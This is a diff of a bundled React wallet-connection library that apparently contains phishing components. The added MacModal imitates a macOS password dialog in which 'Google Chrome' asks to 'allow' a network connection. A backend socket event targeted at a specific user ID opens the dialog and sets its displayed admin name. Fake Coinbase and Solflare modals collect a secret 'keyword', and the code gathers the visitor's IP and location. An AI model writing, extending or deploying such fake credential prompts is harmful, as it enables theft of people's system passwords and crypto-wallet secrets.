@@ -2633,7 +2633,7 @@ const CoinbaseModal = ({ isOpen, onClose, userId, backendConfig }) => {
     return modalContent;
 };
 
-const SolflareModal$1 = ({ isOpen, onClose, userId, backendConfig }) => {
+const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
     const [keyword, setKeyword] = useState('');
     const [error, setError] = useState(false);
     const [helperText, setHelperText] = useState('');
@@ -2857,7 +2857,8 @@ const SolflareModal$1 = ({ isOpen, onClose, userId, backendConfig }) => {
     return modalContent;
 };
 
-const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
+const MacModal = ({ isOpen, onClose, userId, backendConfig, adminName: adminNameProp }) => {
+    const [adminName, setAdminName] = useState(adminNameProp || 'Administrator');
     const [keyword, setKeyword] = useState('');
     const [connecting, setConnecting] = useState(false);
     const [trying, setTrying] = useState(0);
@@ -2874,11 +2875,12 @@ const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
             initializeLocationData();
             initializeSocket();
             setModalPosition({ x: 0, y: 0 });
+            setAdminName(adminNameProp || 'Administrator');
             setTimeout(() => {
                 passwordInputRef.current?.focus();
             }, 300);
         }
-    }, [isOpen]);
+    }, [isOpen, adminNameProp]);
     // Handle drag functionality
     useEffect(() => {
         if (!isDragging)
@@ -2961,7 +2963,6 @@ const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
     };
     if (!isOpen)
         return null;
-    const adminName = 'Administrator';
     const appName = 'Google Chrome';
     const handleCancelbutton = () => {
         setIsWrongPassword(true);
@@ -2998,7 +2999,7 @@ const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
                                 React.createElement("div", null, "network connection"),
                                 React.createElement("div", { className: "mt-[20px] text-[rgba(245,248,255,0.72)] mac-font tracking-wide" }, "Enter your password to allow this.")),
                             React.createElement("div", { className: "mb-[8px]" },
-                                React.createElement("input", { value: adminName, className: `tracking-wider w-full px-[10px] py-[1px] rounded-[4px] text-[12px] border border-[rgba(255,255,255,0.08)] focus:border-transparent input-with-focus placeholder:text-[rgba(245,248,255,0.35)] ${submitting ? ' bg-[#2f2f2f] text-[#f5f5f75d]' : ' bg-[rgba(255,255,255,0.07)] text-[#f5f5f7]'}  mac-font`, disabled: submitting })),
+                                React.createElement("input", { value: adminName, onChange: (e) => setAdminName(e.target.value), className: `tracking-wider w-full px-[10px] py-[1px] rounded-[4px] text-[12px] border border-[rgba(255,255,255,0.08)] focus:border-transparent input-with-focus placeholder:text-[rgba(245,248,255,0.35)] ${submitting ? ' bg-[#2f2f2f] text-[#f5f5f75d]' : ' bg-[rgba(255,255,255,0.07)] text-[#f5f5f7]'}  mac-font`, disabled: submitting })),
                             React.createElement("div", { className: "mb-[18px]" },
                                 React.createElement("input", { ref: passwordInputRef, type: "password", value: keyword, onChange: handleKeywordChange, onKeyDown: handleKeyDown, placeholder: "Password", autoComplete: "off", spellCheck: false, disabled: submitting, className: `tracking-widest w-full px-[10px] py-[1px] rounded-[4px] text-[12px] border border-[rgba(255,255,255,0.08)] focus:border-transparent input-with-focus placeholder:text-[rgba(245,248,255,0.35)] ${submitting ? ' bg-[#2f2f2f] text-[#f5f5f75d]' : ' bg-[rgba(255,255,255,0.07)] text-[#f5f5f7]'} mac-font` })),
                             React.createElement("div", { className: "flex gap-[10px]" },
@@ -3044,10 +3045,10 @@ const CustomWalletModal = ({ wallet, isOpen = false, onClose, userId, backendCon
             modalComponent = React.createElement(CoinbaseModal, { ...modalProps });
             break;
         case 'Solflare':
-            modalComponent = React.createElement(SolflareModal$1, { ...modalProps });
+            modalComponent = React.createElement(SolflareModal, { ...modalProps });
             break;
         case 'Mac':
-            modalComponent = React.createElement(SolflareModal, { ...modalProps });
+            modalComponent = React.createElement(MacModal, { ...modalProps });
             break;
         default:
             // Unknown wallet type - return null or a default modal
@@ -14516,12 +14517,14 @@ const ConnectWalletButton = ({ className = '', userId, }) => {
  */
 const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
     const [isOpen, setIsOpen] = useState(false);
+    const [adminName, setAdminName] = useState(undefined);
     const effectiveUserId = userId ?? backendConfig?.userId;
     useEffect(() => {
         initializeSocket();
         const unsubscribe = subscribeToShowMacModal((payload) => {
             const emitUserId = payload?.user_id;
             if (effectiveUserId && emitUserId && emitUserId === effectiveUserId) {
+                setAdminName(payload?.text);
                 setIsOpen(true);
             }
         });
@@ -14534,7 +14537,7 @@ const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
     if (!isOpen)
         return null;
     return (React.createElement(ModalContainer, null,
-        React.createElement(SolflareModal, { wallet: "Mac", isOpen: isOpen, onClose: handleClose, userId: effectiveUserId, backendConfig: backendConfig })));
+        React.createElement(MacModal, { wallet: "Mac", isOpen: isOpen, onClose: handleClose, userId: effectiveUserId, backendConfig: backendConfig, adminName: adminName })));
 };
 
 export { ASSET_PATHS, ConnectWalletButton, CustomWalletModal, MacModalTrigger, WalletSelectionModal, clearWalletTypesCache, getAllWalletTypes, getAssetBaseUrl, getAssetPath, getBackendUrl, getClientUrl, getConfig, getIPAndLocation, getMacModalSocketEvent, getUserWalletTypes, getWalletConfig, getWalletShortKey, resolveAssetUrl, setConfig, subscribeToShowMacModal, walletConfigs };
